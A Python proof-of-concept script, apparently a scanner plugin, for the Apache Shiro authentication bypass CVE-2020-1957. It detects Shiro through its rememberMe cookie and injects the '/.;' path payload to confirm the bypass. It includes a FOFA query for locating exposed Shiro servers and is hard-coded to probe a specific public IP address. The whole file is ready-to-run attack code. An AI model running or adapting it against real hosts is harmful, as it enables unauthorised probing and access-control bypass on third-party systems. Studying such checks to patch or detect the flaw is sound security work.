#coding:utf-8
import os.path
import os
import re
import requests

class c2Class(object):
	def __init__(self):
		self.vulname = 'Shiro authentication bypass(..;)(CVE-2020-1957)'
		self.vulsystem= 'Shiro'
		self.vulsystemintro = 'Apache Shiro是美国阿帕奇（Apache）软件基金会的一套用于执行认证、授权、加密和会话管理的Java安全框架。'
		self.vulversion = '<1.5.2'
		self.fofa='app="Apache-Shiro"'
		self.findtime='2020-03-25'
		self.cveid='CVE-2020-1957'
		self.refer= r'https://paper.seebug.org/1196/\nhttps://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/'
		self.testisok=True


		self.headers={'Cookie': 'rememberMe=1'}
		self.check_shiro='rememberMe=deleteMe'
		self.rc_css=re.compile(r'(?<=<link href=")/css/.+?(?=" rel="stylesheet"/>)') # /css/style.css
		self.payload='/.;'

	def c2Func(self,target):
		status=0
		returnData=''
		try:
			resq=requests.get(url=target,headers=self.headers,verify=False)
			rh=resq.headers
			if 'Set-Cookie' in rh and self.check_shiro in rh['Set-Cookie']:
				_target=target+'/'
				host=target[:target.index('/',len('https://'))]
				css_q,css_h=self.rc_css.search(resq.text).group()[1:].split('/',1) # css/style.css css_q:css css_h:style.css
				css_q='/'+css_q
				css_h='/'+css_h
				oldCssPath=host+css_q+css_h
				newCssPath=host+css_q+self.payload+css_h
				# print(oldCssPath)
				# print(newCssPath)
				oldCss=requests.get(url=oldCssPath,headers=self.headers,verify=False)
				newCss=requests.get(url=newCssPath,headers=self.headers,verify=False)
				if oldCss.text==newCss.text:
					returnData='%s is vuln(%s), vulpath: %s'%(target,self.vulname,newCssPath)
					status=1
				# print(run_back)
		except Exception as e:
			# print(e)
			returnData=str(e)
		return status,returnData


if __name__ == '__main__':
	target='http://121.40.147.26:86/login'
	pocObj=c2Class()
	print(pocObj.c2Func(target))
